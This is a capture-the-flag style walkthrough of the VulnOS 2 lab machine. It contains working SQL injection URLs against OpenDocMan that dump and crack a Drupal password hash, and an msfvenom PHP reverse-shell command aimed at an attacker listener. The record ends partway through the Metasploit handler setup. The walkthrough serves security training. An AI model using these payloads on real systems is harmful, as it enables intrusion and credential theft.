---
layout: post
title: "VulnOS: 2"
date: 2019-04-15 00:34:01 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub, drupal, opendocman, sqli, john, kernel exploit, overlayfs]
---
<div>VulnHub URL:Â <a href="https://www.vulnhub.com/entry/vulnos-2,147/" target="_blank">https://www.vulnhub.com/entry/vulnos-2,147/</a></div>
<div>Hostname:Â VulnOSv2</div>
<div>IP Address: 10.183.0.181</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Information Gathering/Recon</h2>
</div>
<div><br /></div>
<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.181.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Service Enumeration/Scanning</h2>
</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# nmap -Pn -sT -sV -A -oA vulnosv2 -p 1-65535 10.183.0.181</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-20 18:09 EDT</div>
    <div>Nmap scan report for VulnOSv2.homenet.dom (10.183.0.181)</div>
    <div>Host is up (0.0028s latency).</div>
    <div>Not shown: 65532 closed ports</div>
    <div>PORTÂ Â Â Â Â STATE SERVICE VERSION</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcpÂ Â Â openÂ Â sshÂ Â Â Â Â </font>
        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 6.6.1p1</font>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)</font>
    </div>
    <div>| ssh-hostkey:</div>
    <div>|Â Â Â 1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)</div>
    <div>|Â Â Â 2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)</div>
    <div>|Â Â Â 256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)</div>
    <div>|_Â Â 256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcpÂ Â Â openÂ Â httpÂ Â Â Â Apache httpd 2.4.7 ((Ubuntu))</font>
    </div>
    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7 (Ubuntu)</font>
    </div>
    <div>|_http-title: VulnOSv2</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">6667/tcp openÂ Â ircÂ Â Â Â Â ngircd</font>
    </div>
    <div>MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)</div>
    <div>Device type: general purpose</div>
    <div>Running: Linux 3.X|4.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
    <div>OS details: Linux 3.2 - 4.9</div>
    <div>Network Distance: 1 hop</div>
    <div>Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 2.80 ms VulnOSv2.homenet.dom (10.183.0.181)</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 28.07 seconds</div>
</div>
<div><br /></div>
<!--more-->
<div><br /></div>
<div>
    <h2>Gaining Access</h2>
</div>
<div><br /></div>
<div>Looking at the service information returned from nmap, we have:</div>
<ul>
    <li>
        <div>OpenSSH 6.6.1p1</div>
    </li>
    <li>
        <div>Apache/2.4.7 - possible code execution when combined with PHP 7.0.2</div>
    </li>
    <li>
        <div>ngirc</div>
    </li>
</ul>
<div><br /></div>
<div>Not a lot here, so we will scan the web service with nikto to see if anything else turns up.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# nikto -h http://10.183.0.181</div>
    <div>- Nikto v2.1.6</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Target IP:Â Â Â Â Â Â Â Â Â Â 10.183.0.181</div>
    <div>+ Target Hostname:Â Â Â Â 10.183.0.181</div>
    <div>+ Target Port:Â Â Â Â Â Â Â Â 80</div>
    <div>+ Start Time:Â Â Â Â Â Â Â Â Â 2019-04-20 20:39:16 (GMT-4)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> (Ubuntu)</div>
    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
    <div>+ Server may leak inodes via ETags, header found with file /, inode: 3c9, size: 531f36393d540, mtime: gzip</div>
    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
    <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </div>
    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
    <div>+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host</div>
    <div>+ End Time:Â Â Â Â Â Â Â Â Â Â Â 2019-04-20 20:40:34 (GMT-4) (78 seconds)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ 1 host(s) tested</div>
</div>
<div><br /></div>
<div>Again, not much. I'll go ahead and browse to the site and see what we're dealing with.</div>
<div><br /></div>
<div>Looks like the main content for the site is atÂ <a href="http://10.183.0.181/jabc">http://10.183.0.181/jabc</a>. The site doesn't have a lot of content, but the links look like we have a Drupal backend. Adding '?q=user/login' to the default page confirms this by bringing up a login form.</div>
<div><br /></div>
<div><img height="1080" src="/assets/images/2019-04-15-vulnos-2/E6243D74-E9EC-4302-9681-38A137A75490.png" width="1924" /><br /></div>
<div><br /></div>
<div>Let's scan the site with dirb to see what kinds of directories are available.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>
        <div>root@kali:~/Walkthroughs/vulnosv2# dirb http://10.183.0.181/jabc /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.181-jabc.txt</div>
    </div>
    <div><br /></div>
    <div>-----------------</div>
    <div>DIRB v2.22</div>
    <div>By The Dark Raver</div>
    <div>-----------------</div>
    <div>
        <div><br /></div>
    </div>
    <div>OUTPUT_FILE: dirb-http-10.183.0.181-jabc.txt</div>
    <div>START_TIME: Sat Apr 20 20:53:25 2019</div>
    <div>URL_BASE: http://10.183.0.181/jabc/</div>
    <div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div>
    <div>
        <div><br /></div>
        <div>-----------------</div>
    </div>
    <div>
        <div><br /></div>
    </div>
    <div>GENERATED WORDS: 20458</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Scanning URL: http://10.183.0.181/jabc/ ----</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/includes/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/misc/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/modules/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/profiles/</div>
    <div>+ http://10.183.0.181/jabc/robots.txt (CODE:200|SIZE:1561)</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/scripts/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/sites/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/templates/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.181/jabc/themes/</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/includes/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/misc/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/modules/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/profiles/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/scripts/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/sites/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/templates/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.181/jabc/themes/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
        <div>-----------------</div>
    </div>
    <div>END_TIME: Sat Apr 20 20:54:28 2019 </div>
    <div>DOWNLOADED: 20458 - FOUND: 1</div>
</div>
<div><br /></div>
<div>Looks like we have lots of listable directories with lots of content. I'll use wget to pull down the files so I can search and browse through them offline.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>wget -m http://10.183.0.181/jabc</div>
    <div>wget -m http://10.183.0.181/jabc/includes/</div>
    <div>wget -m http://10.183.0.181/jabc/misc/</div>
    <div>wget -m http://10.183.0.181/jabc/modules/</div>
    <div>wget -m http://10.183.0.181/jabc/profiles/</div>
    <div>wget -m http://10.183.0.181/jabc/scripts/</div>
    <div>wget -m http://10.183.0.181/jabc/sites/</div>
    <div>wget -m http://10.183.0.181/jabc/templates/</div>
    <div>wget -m http://10.183.0.181/jabc/themes/</div>
    <div>for num in $(seq 1 100); do wget -m "http://10.183.0.181/jabc/?q=node/${num}"; done</div>
</div>
<div><br /></div>
<div>Digging into the site content, we can see the site is using Drupal CMS version 7. We get more specific version information fromÂ <a href="http://10.183.0.181/jabc/includes/bootstrap.inc">http://10.183.0.181/jabc/includes/bootstrap.inc</a>.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>&lt;?php</div>
    <div>
        <div><br /></div>
    </div>
    <div>/**</div>
    <div> * @file</div>
    <div> * Functions that need to be loaded on every Drupal request.</div>
    <div> */</div>
    <div>
        <div><br /></div>
    </div>
    <div>/**</div>
    <div> * The current system version.</div>
    <div> */</div>
    <div>define('VERSION', '7.26');</div>
    <div>[...]</div>
</div>
<div><br /></div>
<div>Searching the exploit database, this version of Drupal seems to have several known vulnerabilities.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/34992.py</div>
    <div>Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/44355.php</div>
    <div>Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/34984.py</div>
    <div>Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/34993.php</div>
    <div>Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/35150.php</div>
    <div>Drupal 7.x Module Services - Remote Code ExecutionÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/41564.php</div>
    <div>Drupal &lt; 7.34 - Denial of ServiceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/35415.txt</div>
    <div>Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/44557.rb</div>
    <div>Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/44542.txt</div>
    <div>Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code ExecutionÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/44449.rb</div>
</div>
<div><br /></div>
<div>Unfortunately, trying some of these exploits doesn't result in anything useful.</div>
<div><br /></div>
<div>In addition to dirb, we'll run wfuzz with theÂ urls-Drupal-7.20.txt list from SecLists.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/URLs/urls-Drupal-7.20.txt -t 30 --sc 200 http://10.183.0.181/jabcFUZZ &gt; wfuzz-drupal.txt</div>
</div>
<div><br /></div>
<div>This produces lots of content, but probably nothing we don't already have by mirroring the site with wget (since the directories were listable).</div>
<div><br /></div>
<div>One of the modules that is available is the "PHP filter" module. This module allows you to enter PHP code directly into a Drupal page, so that will be nice to have if we can get into the administrative section of the site.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2/10.183.0.181/jabc/modules/php# cat php.info</div>
    <div>name = PHP filter</div>
    <div>description = Allows embedded PHP code/snippets to be evaluated.</div>
    <div>package = Core</div>
    <div>version = VERSION</div>
    <div>core = 7.x</div>
    <div>files[] = php.test</div>
    <div>
        <div><br /></div>
    </div>
    <div>; Information added by Drupal.org packaging script on 2014-01-15</div>
    <div>version = "7.26"</div>
    <div>project = "drupal"</div>
    <div>datestamp = "1389815930"</div>
</div>
<div><br /></div>
<div>Returning to browsing through the site, we notice the Documentation page (<a href="http://10.183.0.181/jabc/?q=node/7">http://10.183.0.181/jabc/?q=node/7</a>) appears to be blank, so we check the source code and find this...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>[...]</div>
    <div>&lt;div class="field field-name-body field-type-text-with-summary field-label-hidden"&gt;&lt;div class="field-items"&gt;&lt;div class="field-item even" property="content:encoded"&gt;&lt;p&gt;&lt;span style="color:#000000"&gt;Dear customer,&lt;/span&gt;&lt;/p&gt;</div>
    <div>&lt;p&gt;&lt;span style="color:#000000"&gt;For security reasons, this section is hidden.&lt;/span&gt;&lt;/p&gt;</div>
    <div>&lt;p&gt;&lt;span style="color:#000000"&gt;For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest&lt;/span&gt;&lt;/p&gt;</div>
    <div>&lt;p&gt;&lt;span style="color:#000000"&gt;Thank you.&lt;/span&gt;&lt;/p&gt;</div>
    <div>[...]</div>
</div>
<div><br /></div>
<div>VisitingÂ <a href="http://10.183.0.181/jabcd0cs/">http://10.183.0.181/jabcd0cs/</a>Â takes us to a login page for OpenDocMan v1.2.7.</div>
<div><br /></div>
<div>Searching the exploit database for this version of OpenDocMan produces a single entry.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>OpenDocMan 1.2.7 - Multiple VulnerabilitiesÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/webapps/32075.txt</div>
</div>
<div><br /></div>
<div>The write up identifies two vulnerabilities. One is for an unauthenticated SQL injection and another is for an authenticated privilege escalation attack. We have some credentials (guest/guest), but let's try the SQL injection vulnerability first.</div>
<div><br /></div>
<div>We are able to confirm the SQL injection vulnerability using the proof-of-concept (PoC) code in 32075.txt. Using the following URL, we are able to populate the drop down list with the database version.</div>
<div><br /></div>
<div><a href="http://10.183.0.181/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9">http://10.183.0.181/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9</a></div>
<div><br /></div>
<div>Using the following loop, we are able to enumerate all the databases, table names and columns. Since our SQL injection page only allows us to return a single value, we have to make lots of requests and use 'concat_ws' to merge columns (with a separator).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2/sqli# for num in $(seq 0 2000); do wget -O ${num}.html "http://10.183.0.181/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,(select concat_ws(0x2E, 0x23, table_schema, table_name, column_name, 0x23) as cat from information_schema.columns limit 1 offset ${num}),3,4,5,6,7,8,9"; done</div>
</div>
<div><br /></div>
<div>I used the '#' (0x23) character to wrap the returned value, and used a period ('.') as a field separator (0x2E). This way we can easily grep out the values we want...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2/sqli# grep -Po '#\..*?\.#' * | cut -d ':' -f 2 | cut -d '.' -f 2-4 | sort -u</div>
</div>
<div><br /></div>
<div>The primary database and table that interest me is 'drupal7.users'. It has the following columns I'd like to pull information from.</div>
<ul>
    <li>
        <div>uid</div>
    </li>
    <li>
        <div>name</div>
    </li>
    <li>
        <div>pass</div>
    </li>
    <li>
        <div>login</div>
    </li>
</ul>
<div><br /></div>
<div>I'll use the following loop to get the user information...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2/sqli/drupal7.users# for num in $(seq 0 10); do wget -O ${num}.html "http://10.183.0.181/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,(select concat_ws(0x2E, 0x23, uid, name, pass, login, 0x23) as cat from drupal7.users limit 1 offset ${num}),3,4,5,6,7,8,9"; done</div>
</div>
<div><br /></div>
<div>And grep my results...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2/sqli/drupal7.users# grep -Po '#\..*?\.#' * | cut -d ':' -f 2 | cut -d '.' -f 2-6 | sort -u</div>
    <div>0...0.#</div>
    <div>1.webmin.<font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">$S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug</font>.1462351302</div>
</div>
<div><br /></div>
<div>Looks like I have a password hash to crack. Let's create our password file for john.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# cat drupal7-users </div>
    <div>webmin:$S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug</div>
</div>
<div><br /></div>
<div>And we'll start john with just the --single option first.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/.sqlmap/output/10.183.0.181# john --single drupal7-users </div>
    <div>Using default input encoding: UTF-8</div>
    <div>Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])</div>
    <div>Cost 1 (iteration count) is 32768 for all loaded hashes</div>
    <div>Will run 2 OpenMP threads</div>
    <div>Press 'q' or Ctrl-C to abort, almost any other key for status</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">webmin1980Â Â Â Â Â Â Â (webmin)</font>
    </div>
    <div>1g 0:00:00:05 DONE (2019-04-21 00:07) 0.1934g/s 143.5p/s 143.5c/s 143.5C/s webmin1978..webmin1985</div>
    <div>Use the "--show" option to display all of the cracked passwords reliably</div>
    <div>Session completed</div>
</div>
<div><br /></div>
<div>Looks like we got our password! ðŸ˜„</div>
<div><br /></div>
<div>Time to go login to the Drupal admin interface atÂ <a href="http://10.183.0.181/jabc/?q=user/login">http://10.183.0.181/jabc/?q=user/login</a>. Works! After logging in, we go straight to Modules in the top admin menu overlay.</div>
<div><br /></div>
<div><img height="1324" src="/assets/images/2019-04-15-vulnos-2/DC953D6E-5FD5-4E40-A5DB-860D9625B5AD.png" width="2646" /><br /></div>
<div><br /></div>
<div>Let's see if we can enable the PHP filter module so we can insert PHP code directly into pages.</div>
<div><br /></div>
<div><img height="96" src="/assets/images/2019-04-15-vulnos-2/18404C37-FDC4-4653-8DF8-386B85F2FF10.png" width="1166" /><br /></div>
<div><br /></div>
<div>We'll enable the PHP filter plugin and click Save Configuration at the bottom of the page.</div>
<div><br /></div>
<div>Before creating our PHP page, let's generate our PHP reverse shell code using msfvenom.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
    <div>[-] No arch selected, selecting arch: php from the payload</div>
    <div>No encoder or badchars specified, outputting raw payload</div>
    <div>Payload size: 3033 bytes</div>
</div>
<div><br /></div>
<div>We'll also go ahead and set up two listeners in Metasploit. One for our PHP revers shell and one for a perl reverse shell. I like to do this because the PHP reverse shell doesn't stay active for very long.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
    <div>payload =&gt; php/reverse_php</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
